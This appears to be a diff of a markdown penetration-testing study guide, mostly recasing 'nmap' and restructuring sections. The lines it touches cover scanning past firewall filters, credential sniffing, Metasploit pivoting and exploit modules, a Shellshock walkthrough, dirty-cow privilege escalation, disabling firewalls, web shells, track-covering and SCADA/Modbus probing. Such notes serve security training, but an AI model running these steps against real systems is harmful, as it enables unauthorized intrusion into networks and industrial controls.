@@ -66,6 +66,20 @@
 ### 6.10 [  Exploit suggester ](#6.10)
 ### 6.11 [ Malwar3 Writing ](#6.11)
 #
+# 7. [ EVASION ](#7.0)
+### 7.1 [ Evading defensive system ](#7.1)
+### 7.2 [ COVER YOUR TRACKS ](#7.2)
+#
+# 8. [ Advance tips and tactics ](#8.0)
+### 8.1 [ Goal ](#8.1)
+### 8.2 [ Creating and using proxychains ](#8.2)
+### 8.3 [ Explore web shells ](#8.3)
+### 8.4 [ Scanning  against defenses ](#8.4)
+### 8.5 [ Pivoting ](#8.5)
+### 8.6 [ Exploiting Shellshock ](#8.6)
+### 8.7 [ SCADA Evasion ](#8.7)
+### 8.8 [ ICS/SCADA Modbus Protocol](#8.8)
+#
 # <a name="1.0"></a>1. vulnerability 
 ## <a name="0"></a>Brief discussion on " What is Vulnerability ?"
 - Which violates the product.
@@ -215,7 +229,7 @@
 		* Other stacks do not.
 	
 ## <a name="1.14"></a>1.14 Tool 
-* Nmap
+* nmap
 	* Scan includes:
 		* Ping sweeps.
 		* Ports scans.
@@ -406,7 +420,8 @@
 
 		* `dnsrecon`
 
-		* `dnsrecon -t std -d domain_name` std = standard d= dump
+		* `dnsrecon -t std -d domain_name` 
+			* std = standard d= dump
 
 		* If recursion enabled than it means weakness in name server.
 
@@ -516,7 +531,7 @@
 	* Half open scan
 * Live systems
 	* We have to have targets.
-		* `-sP, -sn` in Nmap
+		* `-sP, -sn` in nmap
 
 * netdiscover 
 	* Checks for LAN.
@@ -529,14 +544,14 @@
 	* `netdiscover -i eth0 -p` (listen the network)
 	* `netdiscover -i eth0 -p` (enumerate the target without sending packets, we just have to sit on the network)
 
-* Nmap host discovery
+* nmap host discovery
 	* On local subnet uses ARP.
 	* ICMP is often blocked and host discovery can fail.
 	* Use TCP host discovery sweep.
 	* `namp ip_address/range -PA80 -sn` 
 	* `Ports`
 		* What are the doors on these targets.
-			* Remember all 0-65535 because Nmap only gives us the * enumeration of 1000 ports only.
+			* Remember all 0-65535 because nmap only gives us the * enumeration of 1000 ports only.
 
 			* `-sS,-sT,-sU`  s= scan S= stealth scan; T= connect scan; U= UDP scan.
 
@@ -546,21 +561,21 @@
 
 
 	* identifies all the machines , vmware switches etc and we can eliminate the vmware machines from targets.
-		* `Nmap -sP ip_address/range`
+		* `nmap -sP ip_address/range`
 	* Check all the ports
-		* `Nmap -sS ip_address/range`
+		* `nmap -sS ip_address/range`
 	* check services running on the system
-		* `Nmap -sV ip_address`
+		* `nmap -sV ip_address`
 	* Enumerate target with all options for output to get in xml.
-		* `nmaap -A ip_address` 
-	* Go to Nmap directory and then use this or just move the stylesheet to the current path.
-		* `Nmap -A ip_address -oX test.xml Nmap.xsl` 
-		* `Nmap -sC ip_address`
+		* `nmap -A ip_address` 
+	* Go to nmap directory and then use this or just move the stylesheet to the current path.
+		* `nmap -A ip_address -oX test.xml nmap.xsl` 
+		* `nmap -sC ip_address`
 	 
 	* Using scripting engine to enumerate smb os.
 		* `nmap --script smb-os-discovery ip_address`
 	* operating system detection there are tons of packet sent but find the alternative for this
-		* `Nmap -O ip_address` ()
+		* `nmap -O ip_address` ()
 
 * TCP Dump(Low level Scanning)
 	* check its manual page
@@ -574,13 +589,14 @@
 
 * Tshark
 	* Check manual using 
-		* `$Tshark man`
+		* `$ tshark man`
 	
 * dsniff
 	* See only the credential on the network.
 		* `dsniff` 
 * Unicornscan
-	* Check manual using `unicornscan man`
+	* Check manual using 
+		* `unicornscan man`
 
 * SSL Scan can check the ciphers to encrypt data , we can make traffic look like specific app using these cipher or if we have a vulnerability in the cipher than can exploit it.
 	* `sslscan ip_address`
@@ -628,7 +644,7 @@
 ## <a name="3.4"></a>3.4 Enumeration
 * Is used to gather more in depth information about the target, such as open shares and user account information.
 	* for enumeration Scanning
-	* `Nmap -sC -A` 
+	* `nmap -sC -A` 
 * Windows targets and Linux/Unix with Samba
 
 * `nbstat`
@@ -653,7 +669,8 @@
 		* users
 		* plugins
 		* themes
-	* `wpscan --url ip_address/wordpress --enumerate u --enumerate t --enumerate p` u=users; t=themes p=plugins`
+	* `wpscan --url ip_address/wordpress --enumerate u --enumerate t --enumerate p` 
+		* u=users; t=themes p=plugins
 
 * Directory
 	* Web servers may or may not expose their directories.
@@ -667,30 +684,30 @@
 		* installed by default in kali
 		* 1700 plugins
 		* supports different levels
-		* -1
-			* passive(default)
-		* -2
-			* Polite
-		* -3
-			* Impolite-guess URL when plugin matches(smart, guess a few urls)
-		* -4
-			* Aggressive -guess URL for every plugin (guess a lot of urls like)
+		* Passive(default)
+			* -1
+		* Polite
+			* -2
+		* Impolite-guess URL when plugin matches(smart, guess a few urls)
+			* -3
+		* Aggressive -guess URL for every plugin (guess a lot of urls like)
+			* -4
 		* `whatweb domain_name`
 
 
 * SMB OS Discovery
-	* Nmap has scripts
-		* `Nmap --script smb OS-discovery.nse --script-args=unsafe=1 -p 445 ip_address`
+	* nmap has scripts
+		* `nmap --script smb OS-discovery.nse --script-args=unsafe=1 -p 445 ip_address`
 
 * SNMP
 	* It is a gift because its a db full of information and we can extract data from a single query. works on UDP. 
-		* Nmap -sU -p 161 ip_address]
-		* snmpwalk -Os -c public -v 1 ip_address]
-		* check Nmap scripts for snmp 
-		* `/share/Nmap/script$ ls | snmp]
+		* `nmap -sU -p 161 ip_address`
+		* `snmpwalk -Os -c public -v 1 ip_address`
+		* `check nmap scripts for snmp `
+		* `/share/nmap/script$ ls | snmp`
 * Manual Banner Grabbing
 	* Connect to the port and investigate the response.
-		* telnet
+		* TELNET
 		* netcat
 	* check the version of the service running and exploit available or previous exploit.
 	`nc -vn ip_address port_number]
@@ -1030,7 +1047,7 @@
 		* `searchsploit shellshock remote`
 		* `[searchsploit samba remote` 
 * Manual exploitation
-	* Nmap (gain information about target) 
+	* nmap (gain information about target) 
 	* `sslscan ip_address`
 	* man smbclient (for samba smbclient -L ip_address)
 	* `searchsploit samba remote`
@@ -1224,7 +1241,7 @@
 `arp -a`
 * Windows net commands for locating shares and disabling protections.
 * ftp and tftp bring in your addition tools
-* telnet for banner grabbing in the local intranet
+* TELNET for banner grabbing in the local intranet
 * Check for utilities(especially in Linux)
 * Route Print
 * This will display the routing table of our computer; the netstat -r command can also be used for this
@@ -1429,9 +1446,9 @@
 
 	* Example:
 		* Network services version check
-			* `Nmap -sV ip_address` 
+			* `nmap -sV ip_address` 
 		* Nessus -> Basic network scan
-		* `Nmap -sC ip_address`
+		* `nmap -sC ip_address`
 		* if there is a web server navigate via browser. -> use dirbuster 
 		* Maintain the excel sheet
 		* Scan with vega
@@ -1483,7 +1500,7 @@
 	* Put files within the user profile
 * I want to recommend to read psychological operation at this point of evasion.
 
-# <a name="8.0"></a>8. Advanced Tips and techniques
+# <a name="8.0"></a>8. Advance tips and tactics
 	
 # <a name="8.1"></a>8.1 Goals:
 
@@ -1562,7 +1579,7 @@
 			* `use auxiliary/server/socks4`
 	* Usage
 		* Once you have set the proxy all commands can be used through it using proxychains through the port that you have setup
-			* proxychains Nmap -sT ip_address
+			* proxychains nmap -sT ip_address
 ## <a name="8.3"></a>8.3 Explore web shells
 * Web Shells
 	* Malicious script used by an attacker with the intent to escalate and maintain persistent access on an already compromised web application
@@ -1614,10 +1631,10 @@
 				</body>
 				</html>
 
-## <a name="8.4"></a>8.4 Scanning with Nmap with Nmap against defenses
-* `Nmap -sS ip_address`
-* `Nmap -sS ip_address`
-* `Nmap -sC ip_address`
+## <a name="8.4"></a>8.4 Scanning  against defenses
+* `nmap -sS ip_address`
+* `nmap -sS ip_address`
+* `nmap -sC ip_address`
 * when their is filter applied
 	* Than go to wireshark
 	* And use filter [TCP.flags.syn ==1 and TCP.flags.ack == 1]
@@ -1626,17 +1643,17 @@
 	* apt get install dynagin
 	* get the cisco ios
 * Source port Scanning
-	* `Nmap -sS ip_address -Pn` 
+	* `nmap -sS ip_address -Pn` 
 	* Active ftp
 		* 20
 	* `nc -p 20 ip_address port_number`
 	* wrieshark -> TCP.port == 20 ->capture 
-	* `Nmap -g 20 -sS ip_address/range` 
+	* `nmap -g 20 -sS ip_address/range` 
 		* g=source port
 	* services scan
-		* `Nmap -g 20 -sV ip_address 
-	* `Nmap -sS ip_address -Pn`
-	* `Nmap -g 20 -A ip_addresss`
+		* `nmap -g 20 -sV ip_address 
+	* `nmap -sS ip_address -Pn`
+	* `nmap -g 20 -A ip_addresss`
 	* check metasploit if it has the exploit sometime it don't find the option
 	* `show advanced option`
 	* `set CPORT 20`
@@ -1662,33 +1679,33 @@
 	* turn off firewall using script
 	* `run in powershell\`
 	* and session -i 1 in meterpreteer
-* Pivoting
-	* `run autorout -s ip_address`
-	* `run autoroute -packet`
-	* Search for subnet
-		* `run /exploit/auxilary/arp_scanner` 
-	* Searching for next machine
-		* `search smb version`
-	* `set RHOST ip_address`
-	* `set threads 50`
-	* `run`
-	* And wait
-	* Here in this scenario we have tikiwiki vulnerability 
-		* `search tikiwiki`
-	* `use exploit/unix/webapp/tikiwiki_graph_formula`
-	* `set Rhost and port`
-	* `search ms17-010`
-	* `search ms08_067`	
-## <a name="8.5"></a>8.5 Proxychains
+## <a name="8.5"></a>8.5 Pivoting
+* `run autorout -s ip_address`
+* `run autoroute -packet`
+* Search for subnet
+	* `run /exploit/auxilary/arp_scanner` 
+* Searching for next machine
+	* `search smb version`
+* `set RHOST ip_address`
+* `set threads 50`
+* `run`
+* And wait
+* Here in this scenario we have tikiwiki vulnerability 
+	* `search tikiwiki`
+* `use exploit/unix/webapp/tikiwiki_graph_formula`
+* `set Rhost and port`
+* `search ms17-010`
+* `search ms08_067`	
+* Proxychains 
 * `vi /etc/proxychains.conf` 
 * `search socks`
 * `use auxilary/socks4a`
 * Stealth search
-	* `proxychains Nmap -sT ip_address 
+	* `proxychains nmap -sT ip_address 
 
-##  <a name="8.6"></a>8.6 Exploiting shellshock using curl
-* `Nmap -sS ip_address`
-* `Nmap -sV ip_address`
+##  <a name="8.6"></a>8.6 Exploiting Shellshock
+* `nmap -sS ip_address`
+* `nmap -sV ip_address`
 * `nikto -h ip_address -c all -o nikto.results.html | grep cookies(c=cgi.bin directories)`
 * `web browser -> ipaddress/cgi-bin/printenv (shellshock) runnigscript using html`
 * `nc -l -v -p 123`
@@ -1703,19 +1720,19 @@
 * `chmod +x cowroot32`` 
 * and put the python shell against
 * run the  ./cowroot32 in python environment in victim machine
-## <a name="8.7"></a>8.7 SCADA system.
-* ` Nmap -sP ip_address/range`
+## <a name="8.7"></a>8.7 SCADA Evasion.
+* ` nmap -sP ip_address/range`
 * To check the port
-	* ` Nmap -sS ip_address` 
+	* ` nmap -sS ip_address` 
 * check the port what is running on that port; just see the attack surface
-	* ` Nmap -sV -p 10000 ip_address` 
-* ` Nmap -sC ip_address
+	* ` nmap -sV -p 10000 ip_address` 
+* ` nmap -sC ip_address
 * Check enumeration using check
 * Most iot have default password
-## <a name="8.6"></a>8.6 ICS/SCADA Modbus Protocol
+## <a name="8.8"></a>8.8 ICS/SCADA Modbus Protocol
 * Ping sweep
-	* ` Nmap -sP ip_address `
-* `Nmap -sS ip_address,second_ip`
+	* ` nmap -sP ip_address `
+* `nmap -sS ip_address,second_ip`
 * `metasploit >> Search modbus`
 * `see the modules`
 * `set auuxilary/scanner/scada/modbusclient`
